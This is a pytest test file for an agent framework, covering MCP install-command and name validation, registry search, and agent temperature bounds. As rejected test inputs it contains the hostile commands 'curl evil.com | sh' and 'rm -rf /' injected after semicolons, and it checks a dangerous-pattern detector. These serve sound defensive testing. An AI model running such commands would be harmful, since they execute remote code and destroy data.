"""Tests for batch 10 improvements: MCP manager/registry, coder/researcher agent validation."""

import json
import re
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


# === MCP Manager: Install Validation, Name Validation, Tool Sanitization ===

class TestMCPManagerValidation:
    """Tests for MCP manager input validation."""

    def test_validate_mcp_name_valid(self):
        from forge.mcp.manager import MCPManager
        assert MCPManager.validate_mcp_name("web-search") == ""

    def test_validate_mcp_name_empty(self):
        from forge.mcp.manager import MCPManager
        result = MCPManager.validate_mcp_name("")
        assert "empty" in result.lower()

    def test_validate_mcp_name_too_long(self):
        from forge.mcp.manager import MCPManager
        result = MCPManager.validate_mcp_name("a" * 51)
        assert "too long" in result.lower()

    def test_validate_mcp_name_invalid_chars(self):
        from forge.mcp.manager import MCPManager
        result = MCPManager.validate_mcp_name("mcp; rm -rf /")
        assert result != ""

    def test_validate_install_cmd_safe(self):
        from forge.mcp.manager import MCPManager
        assert MCPManager._validate_install_cmd("pip install mcp-server-fetch") == ""

    def test_validate_install_cmd_npm_safe(self):
        from forge.mcp.manager import MCPManager
        assert MCPManager._validate_install_cmd("npm install -g @modelcontextprotocol/server-github") == ""

    def test_validate_install_cmd_pipe(self):
        from forge.mcp.manager import MCPManager
        result = MCPManager._validate_install_cmd("curl evil.com | sh")
        assert "dangerous" in result.lower()

    def test_validate_install_cmd_semicolon(self):
        from forge.mcp.manager import MCPManager
        result = MCPManager._validate_install_cmd("pip install foo; rm -rf /")
        assert "dangerous" in result.lower()

    def test_validate_install_cmd_empty(self):
        from forge.mcp.manager import MCPManager
        assert MCPManager._validate_install_cmd("") == ""


class TestMCPManagerConstants:
    """Tests for MCP manager constants."""

    def test_install_timeout(self):
        from forge.mcp.manager import MCP_INSTALL_TIMEOUT
        assert MCP_INSTALL_TIMEOUT > 0

    def test_health_check_timeout(self):
        from forge.mcp.manager import MCP_HEALTH_CHECK_TIMEOUT
        assert MCP_HEALTH_CHECK_TIMEOUT > 0

    def test_name_pattern(self):
        from forge.mcp.manager import MCP_NAME_PATTERN
        assert MCP_NAME_PATTERN.match("web-search")
        assert not MCP_NAME_PATTERN.match("")

    def test_dangerous_patterns(self):
        from forge.mcp.manager import DANGEROUS_INSTALL_PATTERNS
        assert DANGEROUS_INSTALL_PATTERNS.search("cmd1 && cmd2")
        assert DANGEROUS_INSTALL_PATTERNS.search("cmd1 | cmd2")
        assert not DANGEROUS_INSTALL_PATTERNS.search("pip install foo")


class TestMCPManagerToolSanitization:
    """Tests for MCP tool name sanitization."""

    def test_tool_name_sanitized(self):
        """Verify that MCP names with special chars get sanitized in tool definitions."""
        # The sanitization regex: re.sub(r'[^a-zA-Z0-9_]', '_', name)
        import re
        name = "web-search"
        safe_name = re.sub(r'[^a-zA-Z0-9_]', '_', name)
        assert safe_name == "web_search"

    def test_tool_name_no_special_chars(self):
        import re
        name = "github"
        safe_name = re.sub(r'[^a-zA-Z0-9_]', '_', name)
        assert safe_name == "github"


# === MCP Registry: Search Bounds, Dedup, Category Validation ===

class TestRegistrySearch:
    """Tests for registry search improvements."""

    def test_search_empty_query_returns_all(self):
        from forge.mcp.registry import search_registry, MCP_REGISTRY
        results = search_registry("")
        assert len(results) == len(MCP_REGISTRY)

    def test_search_by_name(self):
        from forge.mcp.registry import search_registry
        results = search_registry("github")
        assert any(r.name == "github" for r in results)

    def test_search_by_category(self):
        from forge.mcp.registry import search_registry
        results = search_registry("search")
        assert len(results) >= 1

    def test_search_no_duplicates(self):
        from forge.mcp.registry import search_registry
        results = search_registry("search")
        names = [r.name for r in results]
        assert len(names) == len(set(names))

    def test_search_long_query_truncated(self):
        from forge.mcp.registry import search_registry, MAX_SEARCH_QUERY_LENGTH
        long_query = "a" * (MAX_SEARCH_QUERY_LENGTH + 100)
        # Should not crash
        results = search_registry(long_query)
        assert isinstance(results, list)

    def test_search_query_length_constant(self):
        from forge.mcp.registry import MAX_SEARCH_QUERY_LENGTH
        assert MAX_SEARCH_QUERY_LENGTH > 0


class TestRegistrySuggest:
    """Tests for MCP suggestion improvements."""

    def test_suggest_empty_context(self):
        from forge.mcp.registry import suggest_mcps
        assert suggest_mcps("") == []

    def test_suggest_github(self):
        from forge.mcp.registry import suggest_mcps
        results = suggest_mcps("I need to manage my github repo")
        assert any(r.name == "github" for r in results)

    def test_suggest_no_duplicates(self):
        from forge.mcp.registry import suggest_mcps
        # Use a context that might match multiple keywords for same MCP
        results = suggest_mcps("I need github and pull request and issue tracking")
        names = [r.name for r in results]
        assert len(names) == len(set(names))

    def test_suggest_long_context_safe(self):
        from forge.mcp.registry import suggest_mcps
        # Very long context should be truncated, not crash
        long_context = "github " * 10000
        results = suggest_mcps(long_context)
        assert isinstance(results, list)


class TestRegistryConstants:
    """Tests for registry constants."""

    def test_valid_categories(self):
        from forge.mcp.registry import VALID_CATEGORIES
        assert "search" in VALID_CATEGORIES
        assert "development" in VALID_CATEGORIES

    def test_all_entries_have_valid_category(self):
        from forge.mcp.registry import MCP_REGISTRY, VALID_CATEGORIES
        for name, entry in MCP_REGISTRY.items():
            assert entry.category in VALID_CATEGORIES, f"MCP '{name}' has invalid category '{entry.category}'"


# === Coder Agent: Tool Validation, Temperature Bounds ===

class TestCoderAgentValidation:
    """Tests for coder agent factory validation."""

    def test_coder_temperature_constant(self):
        from forge.agents.coder import CODER_TEMPERATURE
        assert 0.0 <= CODER_TEMPERATURE <= 2.0

    def test_coder_default_creation(self):
        from forge.agents.coder import create_coder_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_coder_agent(client)
        assert agent.config.name == "coder"
        assert agent.config.temperature == 0.3

    def test_coder_temperature_clamped(self):
        from forge.agents.coder import create_coder_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_coder_agent(client, temperature=5.0)
        assert agent.config.temperature <= 2.0

    def test_coder_nonexistent_workdir(self):
        from forge.agents.coder import create_coder_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        # Should not crash, falls back to '.'
        agent = create_coder_agent(client, working_dir="/nonexistent/path/xyz")
        assert agent is not None

    def test_coder_has_required_tools(self):
        from forge.agents.coder import create_coder_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_coder_agent(client)
        assert "filesystem" in agent.config.tools


class TestCoderConstants:
    """Tests for coder agent constants."""

    def test_min_temperature(self):
        from forge.agents.coder import MIN_TEMPERATURE
        assert MIN_TEMPERATURE == 0.0

    def test_max_temperature(self):
        from forge.agents.coder import MAX_TEMPERATURE
        assert MAX_TEMPERATURE == 2.0


# === Researcher Agent: Tool Validation, Temperature Bounds ===

class TestResearcherAgentValidation:
    """Tests for researcher agent factory validation."""

    def test_researcher_temperature_constant(self):
        from forge.agents.researcher import RESEARCHER_TEMPERATURE
        assert 0.0 <= RESEARCHER_TEMPERATURE <= 2.0

    def test_researcher_default_creation(self):
        from forge.agents.researcher import create_researcher_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_researcher_agent(client)
        assert agent.config.name == "researcher"
        assert agent.config.temperature == 0.5

    def test_researcher_temperature_clamped(self):
        from forge.agents.researcher import create_researcher_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_researcher_agent(client, temperature=-1.0)
        assert agent.config.temperature >= 0.0

    def test_researcher_nonexistent_workdir(self):
        from forge.agents.researcher import create_researcher_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_researcher_agent(client, working_dir="/nonexistent/path/xyz")
        assert agent is not None

    def test_researcher_has_required_tools(self):
        from forge.agents.researcher import create_researcher_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        agent = create_researcher_agent(client)
        assert "web" in agent.config.tools
        assert "filesystem" in agent.config.tools


class TestResearcherConstants:
    """Tests for researcher agent constants."""

    def test_min_temperature(self):
        from forge.agents.researcher import MIN_TEMPERATURE
        assert MIN_TEMPERATURE == 0.0

    def test_max_temperature(self):
        from forge.agents.researcher import MAX_TEMPERATURE
        assert MAX_TEMPERATURE == 2.0


# === Integration Tests ===

class TestBatch10Integration:
    """Integration tests across batch 10 improvements."""

    def test_mcp_validation_chain(self):
        from forge.mcp.manager import MCPManager
        assert MCPManager.validate_mcp_name("web-search") == ""
        assert MCPManager.validate_mcp_name("") != ""
        assert MCPManager._validate_install_cmd("pip install foo") == ""
        assert MCPManager._validate_install_cmd("cmd1 | cmd2") != ""

    def test_registry_search_chain(self):
        from forge.mcp.registry import search_registry, suggest_mcps
        # Search works
        results = search_registry("github")
        assert len(results) >= 1
        # Suggestions work
        suggestions = suggest_mcps("I need github")
        assert len(suggestions) >= 1
        # Empty inputs handled
        assert search_registry("") is not None
        assert suggest_mcps("") == []

    def test_agent_creation_chain(self):
        from forge.agents.coder import create_coder_agent
        from forge.agents.researcher import create_researcher_agent
        from forge.llm.client import OllamaClient
        client = OllamaClient()
        coder = create_coder_agent(client)
        researcher = create_researcher_agent(client)
        assert coder.config.name == "coder"
        assert researcher.config.name == "researcher"
        assert coder.config.temperature != researcher.config.temperature

    def test_all_registry_entries_valid(self):
        from forge.mcp.registry import MCP_REGISTRY, VALID_CATEGORIES
        from forge.mcp.manager import MCPManager
        for name, entry in MCP_REGISTRY.items():
            # Name is valid
            assert MCPManager.validate_mcp_name(name) == "", f"Invalid MCP name: {name}"
            # Category is valid
            assert entry.category in VALID_CATEGORIES, f"Invalid category for {name}"
